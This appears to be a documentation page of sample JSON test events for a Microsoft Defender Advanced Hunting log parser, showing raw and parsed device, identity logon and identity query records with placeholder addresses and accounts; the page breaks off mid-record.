        "@timestamp": "2022-09-01T07:09:47.498056Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessAccountObjectId": "22222222-2222-2222-2222-222222222222",
                "InitiatingProcessCommandLine": "\"software_reporter_tool.exe\" --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2",
                "InitiatingProcessFileSize": 14687048,
                "InitiatingProcessLogonId": "121834210",
                "InitiatingProcessVersionInfoCompanyName": "Google",
                "InitiatingProcessVersionInfoFileDescription": "Software Reporter Tool",
                "InitiatingProcessVersionInfoInternalFileName": "software_reporter_tool_exe",
                "InitiatingProcessVersionInfoOriginalFileName": "software_reporter_tool.exe",
                "InitiatingProcessVersionInfoProductName": "Software Reporter Tool",
                "InitiatingProcessVersionInfoProductVersion": "102.286.200"
            },
            "type": "NtAllocateVirtualMemoryApiCall"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "destination": {
            "address": "2.2.2.2",
            "ip": "2.2.2.2"
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "104061"
                }
            }
        },
        "process": {
            "args": [
                "--engine=2",
                "--init-done-notifier=804",
                "--mojo-platform-channel-handle=780",
                "--sandbox-mojo-pipe-token=**********",
                "--sandboxed-process-id=2",
                "--use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\""
            ],
            "command_line": "\"software_reporter_tool.exe\" --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2",
            "executable": "c:\\users\\USER\\appdata\\local\\google\\chrome\\user data\\swreporter\\102.286.200\\software_reporter_tool.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "software_reporter_tool.exe",
            "parent": {
                "name": "software_reporter_tool.exe",
                "pid": 15532,
                "start": "2022-09-01T06:56:23.595229Z"
            },
            "pid": 1664,
            "start": "2022-09-01T06:56:23.788784Z",
            "user": {
                "domain": "example.com",
                "email": "user@example.org",
                "id": "user1",
                "name": "user1"
            },
            "working_directory": "c:\\users\\USER\\appdata\\local\\google\\chrome\\user data\\swreporter\\102.286.200"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ],
            "ip": [
                "1.1.1.1",
                "2.2.2.2"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1"
        }
    }
    	
	```


=== "test_identity_info_2.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-10-03T11:13:23.4712503Z\",\"tenantId\":\"22222222-2222-2222-2222-222222222222\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-IdentityInfo\",\"_TimeReceivedBySvc\":\"2024-10-03T11:13:23.4430000Z\",\"properties\":{\"Timestamp\":\"2024-10-03T11:13:23.0234783Z\",\"ReportId\":\"33333333-3333-3333-3333-333333333333\",\"AccountName\":\"user1\",\"AccountDomain\":\"example.com\",\"AccountUpn\":\"johndoe@example.com\",\"AccountObjectId\":\"11111111-1111-1111-1111-111111111111\",\"AccountDisplayName\":\"DOE John\",\"GivenName\":\"Emma\",\"Surname\":\"TSCHAEN\",\"Department\":null,\"JobTitle\":null,\"EmailAddress\":\"johndoe@example.com\",\"Manager\":null,\"Address\":null,\"City\":null,\"Country\":null,\"Phone\":null,\"CreatedDateTime\":\"2024-07-20T02:45:30Z\",\"DistinguishedName\":\"CN=DOE John,OU=PGE,OU=Student,DC=itg,DC=local\",\"OnPremSid\":\"S-1\",\"CloudSid\":\"S-1\",\"IsAccountEnabled\":true,\"SourceProvider\":\"AzureActiveDirectory\",\"ChangeSource\":\"AzureActiveDirectory\",\"BlastRadius\":null,\"CompanyName\":null,\"DeletedDateTime\":null,\"EmployeeId\":null,\"OtherMailAddresses\":null,\"RiskLevel\":null,\"RiskLevelDetails\":null,\"State\":null,\"Tags\":[],\"CriticalityLevel\":null,\"SipProxyAddress\":\"\",\"Type\":\"User\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "iam"
            ],
            "dataset": "identity_info",
            "type": [
                "user"
            ]
        },
        "@timestamp": "2024-10-03T11:13:23.023478Z",
        "action": {
            "name": "Publish",
            "properties": {
                "AccountUPN": "johndoe@example.com"
            }
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "33333333-3333-3333-3333-333333333333"
                }
            }
        },
        "related": {
            "user": [
                "user1"
            ]
        },
        "user": {
            "domain": "example.com",
            "full_name": "DOE John",
            "name": "user1"
        }
    }
    	
	```


=== "test_identity_logon.json"

    ```json
	
    {
        "message": "{\"time\":\"2022-09-01T07:28:59.5127177Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-IdentityLogonEvents\",\"properties\":{\"AccountSid\":null,\"AccountDomain\":null,\"AccountName\":null,\"LogonId\":null,\"FileName\":null,\"FolderPath\":null,\"MD5\":null,\"SHA1\":null,\"FileSize\":null,\"SHA256\":null,\"ProcessCreationTime\":null,\"ProcessTokenElevation\":null,\"RemoteUrl\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"RemoteDeviceName\":null,\"FileOriginIP\":null,\"FileOriginUrl\":null,\"LocalIP\":\"1.1.1.1\",\"LocalPort\":null,\"RemoteIP\":\"2.2.2.2\",\"RemotePort\":null,\"ProcessId\":null,\"ProcessCommandLine\":null,\"AdditionalFields\":\"{\\\"BaseAddress\\\":2098738167808,\\\"RegionSize\\\":262144,\\\"ProtectionMask\\\":64}\",\"ActionType\":\"NtAllocateVirtualMemoryApiCall\",\"InitiatingProcessVersionInfoCompanyName\":\"Google\",\"InitiatingProcessVersionInfoProductName\":\"Software Reporter Tool\",\"InitiatingProcessVersionInfoProductVersion\":\"102.286.200\",\"InitiatingProcessVersionInfoInternalFileName\":\"software_reporter_tool_exe\",\"InitiatingProcessVersionInfoOriginalFileName\":\"software_reporter_tool.exe\",\"InitiatingProcessVersionInfoFileDescription\":\"Software Reporter Tool\",\"InitiatingProcessFolderPath\":\"c:\\\\users\\\\USER\\\\appdata\\\\local\\\\google\\\\chrome\\\\user data\\\\swreporter\\\\102.286.200\\\\software_reporter_tool.exe\",\"InitiatingProcessFileName\":\"software_reporter_tool.exe\",\"InitiatingProcessFileSize\":14687048,\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessLogonId\":121834210,\"InitiatingProcessAccountSid\":\"user1\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountName\":\"user1\",\"InitiatingProcessAccountUpn\":\"user@example.org\",\"InitiatingProcessAccountObjectId\":\"22222222-2222-2222-2222-222222222222\",\"InitiatingProcessCreationTime\":\"2022-09-01T06:56:23.7887846Z\",\"InitiatingProcessId\":1664,\"InitiatingProcessCommandLine\":\"\\\"software_reporter_tool.exe\\\" --use-crash-handler-with-id=\\\"\\\\\\\\.\\\\pipe\\\\crashpad_11111_XXXXXXXXXXXXXXXX\\\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2\",\"InitiatingProcessParentCreationTime\":\"2022-09-01T06:56:23.595229Z\",\"InitiatingProcessParentId\":15532,\"InitiatingProcessParentFileName\":\"software_reporter_tool.exe\",\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"AppGuardContainerId\":\"\",\"MachineGroup\":\"UnassignedGroup\",\"Timestamp\":\"2022-09-01T07:09:47.4980566Z\",\"DeviceName\":\"example.com\",\"ReportId\":104061}}",
        "event": {
            "category": [
                "authentication"
            ],
            "dataset": "identity_logon_events",
            "outcome": "failure",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2022-09-01T07:09:47.498056Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessAccountObjectId": "22222222-2222-2222-2222-222222222222",
                "InitiatingProcessCommandLine": "\"software_reporter_tool.exe\" --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2",
                "InitiatingProcessFileSize": 14687048,
                "InitiatingProcessLogonId": "121834210",
                "InitiatingProcessVersionInfoCompanyName": "Google",
                "InitiatingProcessVersionInfoFileDescription": "Software Reporter Tool",
                "InitiatingProcessVersionInfoInternalFileName": "software_reporter_tool_exe",
                "InitiatingProcessVersionInfoOriginalFileName": "software_reporter_tool.exe",
                "InitiatingProcessVersionInfoProductName": "Software Reporter Tool",
                "InitiatingProcessVersionInfoProductVersion": "102.286.200"
            },
            "type": "NtAllocateVirtualMemoryApiCall"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "destination": {
            "address": "2.2.2.2",
            "ip": "2.2.2.2"
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "104061"
                }
            }
        },
        "process": {
            "args": [
                "--engine=2",
                "--init-done-notifier=804",
                "--mojo-platform-channel-handle=780",
                "--sandbox-mojo-pipe-token=**********",
                "--sandboxed-process-id=2",
                "--use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\""
            ],
            "command_line": "\"software_reporter_tool.exe\" --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2",
            "executable": "c:\\users\\USER\\appdata\\local\\google\\chrome\\user data\\swreporter\\102.286.200\\software_reporter_tool.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "software_reporter_tool.exe",
            "parent": {
                "name": "software_reporter_tool.exe",
                "pid": 15532,
                "start": "2022-09-01T06:56:23.595229Z"
            },
            "pid": 1664,
            "start": "2022-09-01T06:56:23.788784Z",
            "user": {
                "domain": "example.com",
                "email": "user@example.org",
                "id": "user1",
                "name": "user1"
            },
            "working_directory": "c:\\users\\USER\\appdata\\local\\google\\chrome\\user data\\swreporter\\102.286.200"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ],
            "ip": [
                "1.1.1.1",
                "2.2.2.2"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1"
        }
    }
    	
	```


=== "test_identity_logon_2.json"

    ```json
	
    {
        "message": "{\"time\": \"2024-10-03T11:27:16.2140248Z\", \"tenantId\": \"33333333-3333-3333-3333-333333333333\", \"operationName\": \"Publish\", \"category\": \"AdvancedHunting-IdentityLogonEvents\", \"_TimeReceivedBySvc\": \"2024-10-03T11:24:42.5340000Z\", \"properties\": {\"ActionType\": \"LogonSuccess\", \"LogonType\": \"OAuth2:Authorize\", \"Protocol\": null, \"AccountDisplayName\": \"John DOE\", \"AccountUpn\": \"john.doe@example.com\", \"AccountName\": \"john.doe\", \"AccountDomain\": \"example.com\", \"AccountSid\": null, \"AccountObjectId\": \"11111111-1111-1111-1111-111111111111\", \"IPAddress\": \"1.1.1.1\", \"Location\": \"FR\", \"DeviceName\": null, \"OSPlatform\": \"Windows 10\", \"DeviceType\": \"Desktop\", \"ISP\": \"neoma business school\", \"DestinationDeviceName\": null, \"TargetDeviceName\": null, \"FailureReason\": null, \"Port\": null, \"DestinationPort\": null, \"DestinationIPAddress\": null, \"TargetAccountDisplayName\": null, \"AdditionalFields\": {\"ACTOR.ENTITY_USER\": \"John DOE\", \"ACTOR.ALIAS\": \"John DOE\", \"ARG.CLOUD_SERVICE\": \"Editor Browser Extension\", \"Pass-through authentication\": \"false\", \"Request ID\": \"22222222-2222-2222-2222-222222222222\"}, \"ReportId\": \"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\", \"Timestamp\": \"2024-10-03T11:23:16.963Z\", \"Application\": \"Microsoft 365\"}, \"Tenant\": \"DefaultTenant\"}",
        "event": {
            "category": [
                "authentication"
            ],
            "dataset": "identity_logon_events",
            "outcome": "success",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-10-03T11:23:16.963000Z",
        "action": {
            "name": "Publish",
            "properties": {
                "AccountUPN": "john.doe@example.com",
                "Application": "Microsoft 365",
                "ISP": "neoma business school",
                "Location": "FR",
                "LogonType": "OAuth2:Authorize"
            },
            "type": "LogonSuccess"
        },
        "host": {
            "os": {
                "full": "Windows 10"
            },
            "type": "Desktop"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
                }
            }
        },
        "related": {
            "ip": [
                "1.1.1.1"
            ],
            "user": [
                "john.doe"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1"
        },
        "user": {
            "domain": "example.com",
            "full_name": "John DOE",
            "name": "john.doe"
        }
    }
    	
	```


=== "test_identity_logon_3.json"

    ```json
	
    {
        "message": "{\"time\": \"2024-10-01T08:33:28.2285123Z\", \"tenantId\": \"66666666-6666-6666-6666-666666666666\", \"operationName\": \"Publish\", \"category\": \"AdvancedHunting-IdentityLogonEvents\", \"_TimeReceivedBySvc\": \"2024-10-01T08:32:19.6154094Z\", \"properties\": {\"ActionType\": \"LogonSuccess\", \"LogonType\": \"Resource access\", \"Protocol\": \"Ntlm\", \"AccountDisplayName\": \"John DOE\", \"AccountUpn\": \"john.doe@example.com\", \"AccountName\": \"johndoe\", \"AccountDomain\": \"example.com\", \"AccountSid\": \"S-1-5-21-1614895754-1343024091-1177238915-9841\", \"AccountObjectId\": \"22222222-2222-2222-2222-222222222222\", \"IPAddress\": null, \"Location\": null, \"DeviceName\": null, \"OSPlatform\": null, \"DeviceType\": null, \"ISP\": null, \"DestinationDeviceName\": \"srv-dc3.example1.com\", \"TargetDeviceName\": \"srv-radiusnps.example1.com\", \"FailureReason\": null, \"Port\": null, \"DestinationPort\": null, \"DestinationIPAddress\": null, \"TargetAccountDisplayName\": null, \"AdditionalFields\": {\"Count\": \"1\", \"Category\": \"Credential Access\", \"AttackTechniques\": \"Steal or Forge Kerberos Tickets (T1558), Kerberoasting (T1558.003)\", \"IsResourceAccountTrustedForUnconstrainedDelegation\": \"False\", \"SourceAccountId\": \"33333333-3333-3333-3333-333333333333\", \"SourceAccountSid\": \"S-1-5-21-1614895754-1343024091-1177238915-9841\", \"DestinationComputerObjectGuid\": \"55555555-5555-5555-5555-555555555555\", \"DestinationComputerOperatingSystem\": \"windows server 2019 standard\", \"DestinationComputerOperatingSystemVersion\": \"10.0 (17763)\", \"DestinationComputerOperatingSystemType\": \"windows\", \"TargetComputerObjectGuid\": \"11111111-1111-1111-1111-111111111111\", \"TargetComputerOperatingSystem\": \"windows server 2019 datacenter\", \"TargetComputerOperatingSystemVersion\": \"10.0 (17763)\", \"TargetComputerOperatingSystemType\": \"windows\", \"ACTOR.ACCOUNT\": \"John DOE\", \"ACTOR.ENTITY_USER\": \"John DOE\", \"TO.DEVICE\": \"SRV-DC3\", \"TARGET_OBJECT.DEVICE\": \"SRV-RADIUSNPS\"}, \"ReportId\": \"44444444-4444-4444-4444-444444444444\", \"Timestamp\": \"2024-10-01T08:29:14.6761149Z\", \"Application\": \"Active Directory\"}, \"Tenant\": \"DefaultTenant\"}",
        "event": {
            "category": [
                "authentication"
            ],
            "dataset": "identity_logon_events",
            "outcome": "success",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-10-01T08:29:14.676114Z",
        "action": {
            "name": "Publish",
            "properties": {
                "AccountSid": "S-1-5-21-1614895754-1343024091-1177238915-9841",
                "AccountUPN": "john.doe@example.com",
                "Application": "Active Directory",
                "DestinationDeviceName": "srv-dc3.example1.com",
                "LogonType": "Resource access",
                "TargetDeviceName": "srv-radiusnps.example1.com"
            },
            "type": "LogonSuccess"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "44444444-4444-4444-4444-444444444444"
                }
            }
        },
        "network": {
            "protocol": "Ntlm"
        },
        "related": {
            "user": [
                "johndoe"
            ]
        },
        "user": {
            "domain": "example.com",
            "full_name": "John DOE",
            "name": "johndoe"
        }
    }
    	
	```


=== "test_identity_logon_4.json"

    ```json
	
    {
        "message": "{\"time\":\"2025-06-30T14:15:14.0664333Z\",\"tenantId\":\"0000000000000000000000000\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-IdentityLogonEvents\",\"_TimeReceivedBySvc\":\"2025-06-30T14:13:25.5202770Z\",\"properties\":{\"ActionType\":\"LogonFailed\",\"LogonType\":\"Failed logon with certificate\",\"Protocol\":\"Kerberos\",\"AccountDisplayName\":\"test USER\",\"AccountUpn\":\"test.user@test-test.test\",\"AccountName\":\"user1\",\"AccountDomain\":\"example.com\",\"AccountSid\":\"S-1-5-21-test-account-id\",\"AccountObjectId\":\"1111111111111111\",\"IPAddress\":\"1.1.1.1\",\"Location\":null,\"DeviceName\":\"example.com\",\"OSPlatform\":null,\"DeviceType\":null,\"ISP\":\"INTERNAL_NETWORK\",\"DestinationDeviceName\":\"TEST_TO_DEVICE.test.test\",\"TargetDeviceName\":null,\"FailureReason\":\"Generic\",\"Port\":57460,\"DestinationPort\":88,\"DestinationIPAddress\":\"2.2.2.2\",\"TargetAccountDisplayName\":null,\"AdditionalFields\":{\"ActionTypeInner\":\"certificatefailedlogon\",\"ErrorText\":\"padatatypenotsupported\",\"KdcOptions\":\"renewableok, canonicalize, renewable, forwardable\",\"CertificateSubject\":\"s-1-5-21-test-account-id/091919191919199191/login.windows.net/123123123213123213/test.user@test-test.test\",\"CertificateThumbprint\":\"0000000000000000\",\"CertificateIssuer\":\"azure active directory\",\"Count\":\"1\",\"SourceAccountName\":\"TEST.TEST\\\\testuser\",\"Error\":\"PadataTypeNotSupported\",\"SourceAccountId\":\"test-source-account-id\",\"SourceAccountSid\":\"S-1-5-21-test-account-id\",\"SourceComputerObjectGuid\":\"00000000-source-test-computer-id\",\"SourceComputerOperatingSystem\":\"windows 11 entreprise\",\"SourceComputerOperatingSystemVersion\":\"10.0 (26100)\",\"SourceComputerOperatingSystemType\":\"windows\",\"DestinationComputerObjectGuid\":\"destination-computer-object-guid-0000000000\",\"DestinationComputerOperatingSystem\":\"windows server 2022 standard\",\"DestinationComputerOperatingSystemVersion\":\"10.0 (20348)\",\"DestinationComputerOperatingSystemType\":\"windows\",\"SourceComputerId\":\"00000000-source-test-computer-id\",\"SourceComputerSid\":\"S-1-5-21-0000000000000000000000000\",\"ACTOR.ACCOUNT\":\"test USER\",\"ACTOR.ENTITY_USER\":\"test USER\",\"testOM.DEVICE\":\"TESTACTORDEVICE\",\"TO.DEVICE\":\"TEST_TO_DEVICE\",\"ACTOR.DEVICE\":\"TESTACTORDEVICE\"},\"UncommonForUser\":null,\"LastSeenForUser\":null,\"ReportId\":\"11111111-1111-1111-1111-111111111111\",\"Timestamp\":\"2025-06-30T14:13:06.48127Z\",\"Application\":\"Active Directory\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "authentication"
            ],
            "dataset": "identity_logon_events",
            "outcome": "Generic",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2025-06-30T14:13:06.481270Z",
        "action": {
            "name": "Publish",
            "outcome": "Generic",
            "properties": {
                "AccountSid": "S-1-5-21-test-account-id",
                "AccountUPN": "test.user@test-test.test",
                "Application": "Active Directory",
                "DestinationDeviceName": "TEST_TO_DEVICE.test.test",
                "ISP": "INTERNAL_NETWORK",
                "LogonType": "Failed logon with certificate",
                "SourceComputerId": "00000000-source-test-computer-id",
                "SourceComputerObjectGuid": "00000000-source-test-computer-id"
            },
            "type": "LogonFailed"
        },
        "destination": {
            "address": "2.2.2.2",
            "ip": "2.2.2.2",
            "port": 88
        },
        "host": {
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "11111111-1111-1111-1111-111111111111"
                }
            }
        },
        "network": {
            "protocol": "Kerberos"
        },
        "related": {
            "ip": [
                "1.1.1.1",
                "2.2.2.2"
            ],
            "user": [
                "user1"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1"
        },
        "user": {
            "domain": "example.com",
            "full_name": "test USER",
            "name": "user1"
        }
    }
    	
	```


=== "test_identity_query.json"

    ```json
	
    {
        "message": "{\"time\":\"2022-09-01T07:28:59.5127177Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-IdentityQueryEvents\",\"properties\":{\"AccountSid\":null,\"AccountDomain\":null,\"AccountName\":null,\"LogonId\":null,\"FileName\":null,\"FolderPath\":null,\"MD5\":null,\"SHA1\":null,\"FileSize\":null,\"SHA256\":null,\"ProcessCreationTime\":null,\"ProcessTokenElevation\":null,\"RemoteUrl\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"RemoteDeviceName\":null,\"FileOriginIP\":null,\"FileOriginUrl\":null,\"LocalIP\":\"1.1.1.1\",\"LocalPort\":null,\"RemoteIP\":\"2.2.2.2\",\"RemotePort\":null,\"ProcessId\":null,\"ProcessCommandLine\":null,\"AdditionalFields\":\"{\\\"BaseAddress\\\":2098738167808,\\\"RegionSize\\\":262144,\\\"ProtectionMask\\\":64}\",\"ActionType\":\"NtAllocateVirtualMemoryApiCall\",\"InitiatingProcessVersionInfoCompanyName\":\"Google\",\"InitiatingProcessVersionInfoProductName\":\"Software Reporter Tool\",\"InitiatingProcessVersionInfoProductVersion\":\"102.286.200\",\"InitiatingProcessVersionInfoInternalFileName\":\"software_reporter_tool_exe\",\"InitiatingProcessVersionInfoOriginalFileName\":\"software_reporter_tool.exe\",\"InitiatingProcessVersionInfoFileDescription\":\"Software Reporter Tool\",\"InitiatingProcessFolderPath\":\"c:\\\\users\\\\USER\\\\appdata\\\\local\\\\google\\\\chrome\\\\user data\\\\swreporter\\\\102.286.200\\\\software_reporter_tool.exe\",\"InitiatingProcessFileName\":\"software_reporter_tool.exe\",\"InitiatingProcessFileSize\":14687048,\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessLogonId\":121834210,\"InitiatingProcessAccountSid\":\"user1\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountName\":\"user1\",\"InitiatingProcessAccountUpn\":\"user@example.org\",\"InitiatingProcessAccountObjectId\":\"22222222-2222-2222-2222-222222222222\",\"InitiatingProcessCreationTime\":\"2022-09-01T06:56:23.7887846Z\",\"InitiatingProcessId\":1664,\"InitiatingProcessCommandLine\":\"\\\"software_reporter_tool.exe\\\" --use-crash-handler-with-id=\\\"\\\\\\\\.\\\\pipe\\\\crashpad_11111_XXXXXXXXXXXXXXXX\\\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2\",\"InitiatingProcessParentCreationTime\":\"2022-09-01T06:56:23.595229Z\",\"InitiatingProcessParentId\":15532,\"InitiatingProcessParentFileName\":\"software_reporter_tool.exe\",\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"AppGuardContainerId\":\"\",\"MachineGroup\":\"UnassignedGroup\",\"Timestamp\":\"2022-09-01T07:09:47.4980566Z\",\"DeviceName\":\"example.com\",\"ReportId\":104061}}",
        "event": {
            "category": [
                "iam"
            ],
            "dataset": "identity_query_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2022-09-01T07:09:47.498056Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessAccountObjectId": "22222222-2222-2222-2222-222222222222",
                "InitiatingProcessCommandLine": "\"software_reporter_tool.exe\" --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2",
                "InitiatingProcessFileSize": 14687048,
                "InitiatingProcessLogonId": "121834210",
                "InitiatingProcessVersionInfoCompanyName": "Google",
                "InitiatingProcessVersionInfoFileDescription": "Software Reporter Tool",
                "InitiatingProcessVersionInfoInternalFileName": "software_reporter_tool_exe",
                "InitiatingProcessVersionInfoOriginalFileName": "software_reporter_tool.exe",
                "InitiatingProcessVersionInfoProductName": "Software Reporter Tool",
                "InitiatingProcessVersionInfoProductVersion": "102.286.200"
            },
            "type": "NtAllocateVirtualMemoryApiCall"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "destination": {
            "address": "2.2.2.2",
            "ip": "2.2.2.2"
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "104061"
                }
            }
        },
        "process": {
            "args": [
                "--engine=2",
                "--init-done-notifier=804",
                "--mojo-platform-channel-handle=780",
                "--sandbox-mojo-pipe-token=**********",
                "--sandboxed-process-id=2",
                "--use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\""
            ],
            "command_line": "\"software_reporter_tool.exe\" --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2",
            "executable": "c:\\users\\USER\\appdata\\local\\google\\chrome\\user data\\swreporter\\102.286.200\\software_reporter_tool.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "software_reporter_tool.exe",
            "parent": {
                "name": "software_reporter_tool.exe",
                "pid": 15532,
                "start": "2022-09-01T06:56:23.595229Z"
            },
            "pid": 1664,
            "start": "2022-09-01T06:56:23.788784Z",
            "user": {
                "domain": "example.com",
                "email": "user@example.org",
                "id": "user1",
                "name": "user1"
            },
            "working_directory": "c:\\users\\USER\\appdata\\local\\google\\chrome\\user data\\swreporter\\102.286.200"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ],
            "ip": [
                "1.1.1.1",
                "2.2.2.2"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1"
        }
    }
    	
	```


=== "test_identity_query_2.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-10-01T08:33:55.2270559Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-IdentityQueryEvents\",\"_TimeReceivedBySvc\":\"2024-10-01T08:32:45.9638646Z\",\"properties\":{\"ActionType\":\"DNS query\",\"QueryTarget\":\"1.cnr.io\",\"Protocol\":\"Dns\",\"AccountDisplayName\":null,\"AccountUpn\":null,\"AccountName\":null,\"AccountDomain\":null,\"AccountSid\":null,\"AccountObjectId\":null,\"Query\":null,\"IPAddress\":\"2.2.2.2\",\"Location\":null,\"DeviceName\":\"example.com\",\"QueryType\":\"Text\",\"DestinationDeviceName\":\"srv-dc1.example.com\",\"TargetAccountDisplayName\":null,\"TargetDeviceName\":null,\"Port\":38529,\"DestinationPort\":53,\"DestinationIPAddress\":\"1.1.1.1\",\"TargetAccountUpn\":null,\"AdditionalFields\":{\"Count\":\"1\",\"ARG.TASK\":\"DNS query\",\"SourceComputerOperatingSystemType\":\"unknown\",\"DestinationComputerObjectGuid\":\"22222222-2222-2222-2222-222222222222\",\"DestinationComputerOperatingSystem\":\"windows server 2019 datacenter\",\"DestinationComputerOperatingSystemVersion\":\"10.0 (17763)\",\"DestinationComputerOperatingSystemType\":\"windows\",\"SourceComputerId\":\"computer domain office 